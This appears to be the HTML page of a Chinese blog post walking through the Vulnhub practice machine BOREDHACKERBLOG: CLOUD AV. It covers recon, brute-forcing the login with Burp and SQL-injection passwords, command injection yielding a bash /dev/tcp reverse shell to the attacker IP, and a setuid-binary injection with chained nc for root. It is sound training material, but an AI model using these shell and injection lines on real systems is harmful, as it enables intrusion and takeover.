@@ -1,0 +1,269 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Vulnhub靶机随笔-BOREDHACKERBLOG:CLOUD AV | SweetGuyWYF's Blog</title><meta name="author" content="YWF"><meta name="copyright" content="YWF"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Vulnhub靶机 BOREDHACKERBLOG:CLOUD AV详解攻击机Kali  IP:192.168.3.44 靶机    IP:未知  系统:未知 A.信息收集 扫描靶机存活性 确定IP地址 1.命令:arp-scan -l  扫描靶机开放端口及其服务版本信息 2.命令 nmap -A -p- -sV 靶机IP地址  3.两个开放端口,暂时不清楚什么漏洞,扫一下网站的后台子目录顺便访问">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub靶机随笔-BOREDHACKERBLOG:CLOUD AV">
+<meta property="og:url" content="http://example.com/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BABOREDHACKERBLOG_CLOUD_AV%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="SweetGuyWYF&#39;s Blog">
+<meta property="og:description" content="Vulnhub靶机 BOREDHACKERBLOG:CLOUD AV详解攻击机Kali  IP:192.168.3.44 靶机    IP:未知  系统:未知 A.信息收集 扫描靶机存活性 确定IP地址 1.命令:arp-scan -l  扫描靶机开放端口及其服务版本信息 2.命令 nmap -A -p- -sV 靶机IP地址  3.两个开放端口,暂时不清楚什么漏洞,扫一下网站的后台子目录顺便访问">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/a.jpg">
+<meta property="article:published_time" content="2024-05-13T11:20:30.098Z">
+<meta property="article:modified_time" content="2024-05-13T11:21:28.592Z">
+<meta property="article:author" content="YWF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/a.jpg"><link rel="shortcut icon" href="/image/bore.png"><link rel="canonical" href="http://example.com/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BABOREDHACKERBLOG_CLOUD_AV%E8%AF%A6%E8%A7%A3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Vulnhub靶机随笔-BOREDHACKERBLOG:CLOUD AV',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-05-13 19:21:28'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/image/a.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/789.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="SweetGuyWYF's Blog"><span class="site-name">SweetGuyWYF's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub靶机随笔-BOREDHACKERBLOG:CLOUD AV</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-13T11:20:30.098Z" title="发表于 2024-05-13 19:20:30">2024-05-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-13T11:21:28.592Z" title="更新于 2024-05-13 19:21:28">2024-05-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnhub靶机随笔-BOREDHACKERBLOG:CLOUD AV"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Vulnhub靶机-BOREDHACKERBLOG-CLOUD-AV详解"><a href="#Vulnhub靶机-BOREDHACKERBLOG-CLOUD-AV详解" class="headerlink" title="Vulnhub靶机 BOREDHACKERBLOG:CLOUD AV详解"></a>Vulnhub靶机 BOREDHACKERBLOG:CLOUD AV详解</h1><p>攻击机Kali  IP:192.168.3.44</p>
+<p>靶机    IP:未知  系统:未知</p>
+<p><strong>A.信息收集</strong></p>
+<p><strong>扫描靶机存活性 确定IP地址</strong></p>
+<p>1.命令:arp-scan -l</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/0cfa2f38883e4bd7bd0d8f6d4ff1d4ea.png" alt="img"></p>
+<p><strong>扫描靶机开放端口及其服务版本信息</strong></p>
+<p>2.命令 nmap -A -p- -sV 靶机IP地址</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/5930289baf004a788e003383b66688fc.png" alt="img"></p>
+<p>3.两个开放端口,暂时不清楚什么漏洞,扫一下网站的后台子目录顺便访问网站继续搜集信息的同时msfconsole跑一下ssh弱口令</p>
+<p>ssh弱口令:  无果<br> <img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/8eed09f2cb924578a08058f00ffca13b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">​编辑</p>
+<p>子目录:  console scan 200     login output 405</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/f3aa45ff10844cc0bdef9b5b18cd3e1c.png" alt="img"></p>
+<p>端口8080网站:</p>
+<p>需要一个code 才能登录</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/d5f1e0b03ba04a828788434a0c2228c8.png" alt="img"></p>
+<p>Console子目录:</p>
+<p>需要一个pin码 才能够访问,可能后续 我们拿到shell可以获取这个pin码 先放着</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/48737aca8419436b8d46d020b1f0f706.png" alt="img"></p>
+<p><strong>B.BurpSuit 截取流量 暴力破解</strong></p>
+<p>1.打开我们的burpsuit先生,并且开启监听,截取流量,并发送到Inturder</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/93c9d1668405486f8e90c588d9596c1c.png" alt="img"></p>
+<p>2.在Intruder模式给password的参数添加两个符号</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/1b3913724ffc42c7b1895bf161f7447b.png" alt="img"></p>
+<p>3.这有两种思路</p>
+<p>​    1)SQL注入</p>
+<p>这里填入的是SQL注入万能密码</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/830306e02cf94a5d971e33f0d64a3230.png" alt="img"></p>
+<p><strong>可以看到,有这么几个密码都是可以轻松绕过的</strong></p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/f0ab95c730f643edb27521fa21d0b84f.png" alt="img"></p>
+<p>​    2)弱口令爆破</p>
+<p>这里填入的是弱口令字典</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/8b11e67f943f479d9bec712059b7f48b.png" alt="img"></p>
+<p>密码为password</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/ec56cc5596f7470f9dc1e82f0c9e39e6.png" alt="img"></p>
+<p><strong>C.瑞士军刀</strong></p>
+<p>登陆成功后:  这是一个病毒扫描的云服务,需要填入对应的文件名,第一感觉就是命令注入,我们随便试一个 cat | id 或 cat &amp; id</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/d6aa3e8b84df4a41b2ab529c8011a9b3.png" alt="img"></p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/b8e617468d4947be96fde8521c02f764.png" alt="img"></p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/b503d1a8c1da4c0681f45dfa07a037d9.png" alt="img"></p>
+<p>果不其然,直接上瑞士军刀吧 也可以用python的反弹shell代码,因为网站版本是python2.7,但是回显或有点慢,所以我选择瑞士军刀</p>
+<p>命令: cat | echo ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机IP&#x2F;攻击机开放port 0&gt;&amp;1’|bash</p>
+<p>我用的命令: cat | echo ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.44&#x2F;4444 0&gt;&amp;1’|bash</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/d5f2ab632ca84739bbdd82d226dc74a8.png" alt="img"></p>
+<p><strong>D.提权</strong></p>
+<p>1.查看当前目录文件</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/4afbd87590c14cf4b674a314ff7e47d0.png" alt="img"></p>
+<p>这有个database.sql 我们查看一下他的文件类型 发现是sqlite文件 这就很关键了很有可能里面有用户名和密码</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/04893627197d44d4a36188ef61a38191.png" alt="img"></p>
+<p><em>简短做个补充:</em></p>
+<p>​    <em>SQLite是一个进程内的轻量级嵌入式数据库，它的数据库就是一个文件，实现了自给自足、无服务器、零配置的、事务性的SQL数据库引擎。它是一个零配置的数据库，这就体现出来SQLite与其他数据库的最大的区别：SQLite不需要在系统中配置，直接可以使用。且SQLite不是一个独立的进程，可以按应用程序需求进行静态或动态连接。SQLite可直接访问其存储文件。</em></p>
+<p>将此文件 通过nc传到我们的攻击机上</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/0df41452df3c4a82a6661031eb1d348f.png" alt="img"></p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/bc21f4e8ed8a4fa1bf8830c870dd6f20.png" alt="img"></p>
+<p>运行sqlite3</p>
+<p>命令:   .open data.sql    &#x2F;&#x2F;打开数据库</p>
+<p>​       .databse        &#x2F;&#x2F;当前数据库名</p>
+<p>​       .dump         &#x2F;&#x2F;查看当前数据库数据</p>
+<p>得到四个疑似密码</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/e7a4b24a635141a7b8996daf1fc4bf2e.png" alt="img"></p>
+<p>接着 查看一下&#x2F;etc&#x2F;passwd文件里有哪几个用户可以登录</p>
+<p>Root cloudav scanner</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/0a52c32f13e54555ae8fd4a3fc1eb8eb.png" alt="img"></p>
+<p>将用户名写入一个文件user.txt 将密码也写入一个文件password.txt 利用hydra进行爆破</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/7f94f56bccae464cb373ae8127c137f2.png" alt="img"></p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/8db46f32e88a42d0a3570f4220969cf6.png" alt="img"></p>
+<p>被摆了一道,密码或许就是个幌子……</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/5d5f42fc1c2e4f17935bacf415f64095.png" alt="img"></p>
+<p>2.别放弃,继续挨个翻目录文件,在&#x2F;home&#x2F;scanner下有几个特殊文件</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/c4fdd7f5746d48ef89fa79a3bf696508.png" alt="img"></p>
+<p>一个像是编译好的文件,一个源码</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/61ef2df76a694f3a9f6571218dcf50b4.png" alt="img"></p>
+<p>3.查看一下文件权限  发现是可执行文件且权限为4000</p>
+<p>4.一下就来劲了,查看一眼他的源码</p>
+<p>程序大致意思是</p>
+<p>传入一个argc 一个指针数组*argv[]</p>
+<p>如果argc小于2 就会返回一段话</p>
+<p>如果argc大于2 就会执行命令</p>
+<p>所以我大胆猜测这又是一个命令行注入</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/cb3646cc46584a5cb49273b9a56d7057.png" alt="img"></p>
+<p>运行程序 添加参数”3 | id ” 实际运行下来好像1也可以 我暂时不管了 C这一块忘记了    程序能跑起来就行</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/375076d7cd1d4b4b8b65ce18e1d889c4.png" alt="img"></p>
+<p>这里用到的思路是    nc串联</p>
+<p>命令:.&#x2F;update_cloudav “3 | nc 攻击机IP 攻击机第一个PORT | &#x2F;bin&#x2F;bash | nc 攻击机IP 攻击机第二个PORT”</p>
+<p>我的命令: .&#x2F;update_cloudav “3 |nc 192.168.3.44 7777 |&#x2F;bin&#x2F;bash |nc 192.168.3.44 9999”</p>
+<p>成功提权</p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/8fa83b81a0034f0e8e942935036cdad9.png" alt="img"></p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/d792e5a89b26477a8edc252490e04188.png" alt="img"></p>
+<p><img src="/../Vulnhub/BOREDHACKERBLOG_CLOUD_AV/2110bf050f1744e085a70bb1104b8917.png" alt="img"></p>
+<p>*<strong>提剑跨骑挥鬼雨，白骨如山鸟惊飞。*</strong></p>
+<p>*<strong>尘事如潮人如水，只叹江湖几人回。*</strong></p>
+<p><strong>好了,到这我们的文章真的结束了,有不懂的可以私信我</strong></p>
+<p><strong>你们的点赞和关注是我更新的动力,让我们一起努力~~</strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">YWF</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BABOREDHACKERBLOG_CLOUD_AV%E8%AF%A6%E8%A7%A3/">http://example.com/2024/05/13/Vulnhub靶机BOREDHACKERBLOG_CLOUD_AV详解/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">SweetGuyWYF's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/image/a.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/image/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/image/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/image/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/image/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BAThr0ll%E8%AF%A6%E8%A7%A3/" title="Vulnhub靶机随笔-Thr0ll"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Vulnhub靶机随笔-Thr0ll</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/image/a.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">YWF</div><div class="author-info__description">天下风云出我辈，一入江湖岁月催。 皇图霸业谈笑中，不胜人生一场醉。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/SweetGuyWYF" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/weixin_59005129?spm=1018.2226.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="https://qm.qq.com/q/a2QCdU7beE" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:1687188480@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnhub%E9%9D%B6%E6%9C%BA-BOREDHACKERBLOG-CLOUD-AV%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">Vulnhub靶机 BOREDHACKERBLOG:CLOUD AV详解</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BABOREDHACKERBLOG_CLOUD_AV%E8%AF%A6%E8%A7%A3/" title="Vulnhub靶机随笔-BOREDHACKERBLOG:CLOUD AV">Vulnhub靶机随笔-BOREDHACKERBLOG:CLOUD AV</a><time datetime="2024-05-13T11:20:30.098Z" title="发表于 2024-05-13 19:20:30">2024-05-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BAThr0ll%E8%AF%A6%E8%A7%A3/" title="Vulnhub靶机随笔-Thr0ll">Vulnhub靶机随笔-Thr0ll</a><time datetime="2024-05-13T11:07:16.972Z" title="发表于 2024-05-13 19:07:16">2024-05-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BAOS-ByteSec%E8%AF%A6%E8%A7%A3/" title="Vulnhub靶机随笔-OS-ByteSec">Vulnhub靶机随笔-OS-ByteSec</a><time datetime="2024-05-13T11:04:06.408Z" title="发表于 2024-05-13 19:04:06">2024-05-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/13/Vulnhub%E9%9D%B6%E6%9C%BACYNIX_1%E8%AF%A6%E8%A7%A3/" title="Vulnhub靶机随笔-CYNIX_1">Vulnhub靶机随笔-CYNIX_1</a><time datetime="2024-05-13T10:49:15.013Z" title="发表于 2024-05-13 18:49:15">2024-05-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/11/Vulnhub%E9%9D%B6%E6%9C%BAHacksudo_Aliens%E8%AF%A6%E8%A7%A3/" title="Vulnhub靶机随笔-Hacksudo_Aliens">Vulnhub靶机随笔-Hacksudo_Aliens</a><time datetime="2024-05-11T05:52:08.398Z" title="发表于 2024-05-11 13:52:08">2024-05-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By YWF</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  